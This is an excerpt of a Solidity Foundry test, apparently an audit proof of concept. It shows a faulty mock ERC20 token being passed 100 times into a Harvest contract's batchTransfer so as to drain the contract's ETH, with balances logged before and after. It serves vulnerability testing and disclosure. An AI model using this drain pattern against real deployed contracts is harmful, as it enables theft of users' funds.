...
contract HarvestTest is Test {
    ...
    MockFaultyERC20 public mockFaultyERC20;
    ...
    function setUp() public {
        ...
        mockFaultyERC20 = new MockFaultyERC20();
        mockFaultyERC20.mint(user1, 1000);
    ...
    function test_batchTransfer_Success_ERCFaulty20_Drains_Contract() public {
        TokenType[] memory tokenTypes = new TokenType[](100);
        address[] memory tokenContracts = new address[](100);
        uint256[] memory tokenIds = new uint256[](100);
        uint256[] memory counts = new uint256[](100);

        for(uint i; i<100; i++) {
            tokenTypes[i] = TokenType.ERC20;
            tokenContracts[i] = address(mockFaultyERC20);
            tokenIds[i] = 0;
            counts[i] = 0;
        }
        ...
        vm.startPrank(user1);
        mockERC20.approve(address(harvest), 1);
        console.log("Balance of contract before batchTranfer",address(harvest).balance);
        console.log("Balance of Faulty user before batchTranfer",address(user1).balance);
        harvest.batchTransfer(tokenTypes, tokenContracts, tokenIds, counts);
        console.log("Balance of contract after batchTranfer",address(harvest).balance);
        console.log("Balance of Faulty user after batchTranfer",address(user1).balance);
    }
